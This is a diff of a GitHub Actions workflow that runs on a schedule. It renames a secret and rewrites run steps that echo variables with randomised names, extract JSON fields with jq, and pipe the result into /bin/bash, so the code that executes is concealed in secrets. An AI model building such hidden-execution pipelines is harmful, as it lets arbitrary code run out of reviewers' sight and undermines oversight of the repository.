@@ -1,24 +1,27 @@
 name: weishenmeda
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
+    - cron: '39 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weishenmeda
         env:
-          atwaq4: ${{ secrets.atwaq4 }}
+          qilgy31687: ${{ secrets.qilgy31687 }}
         run: |
-          echo $atwaq4 | jq -r .pep877 | /bin/bash
-          echo $mdh366 | jq -r .lgcc852 | /bin/bash
-          echo $dax65797 | jq -r .d16 | /bin/bash
-          echo $y2 | jq -r .ncx18 | /bin/bash
-          echo $o7553 | jq -r .f849 | /bin/bash
-          echo $z080 | jq -r .bgzh7 | /bin/bash
-          echo $eeu6160 | jq -r .hlwk43335 | /bin/bash
+          echo $qilgy31687 | jq -r .dw89 | /bin/bash
+          echo $ws06024 | jq -r .mjmq12 | /bin/bash
+          echo $del53275 | jq -r .cf0229 | /bin/bash
+          echo $knrct2 | jq -r .ohmld29 | /bin/bash
+          echo $ej5 | jq -r .dlbeq9388 | /bin/bash
+          echo $axjtr71 | jq -r .pvdh13122 | /bin/bash
+          echo $suz49626 | jq -r .xutx32342 | /bin/bash
+          echo $spvtu26753 | jq -r .zeetm1 | /bin/bash
+          echo $hiis3652 | jq -r .kjetl93 | /bin/bash
+          echo $no4928 | jq -r .yxvo8 | /bin/bash
+          echo $y485 | jq -r .laz053 | /bin/bash
 
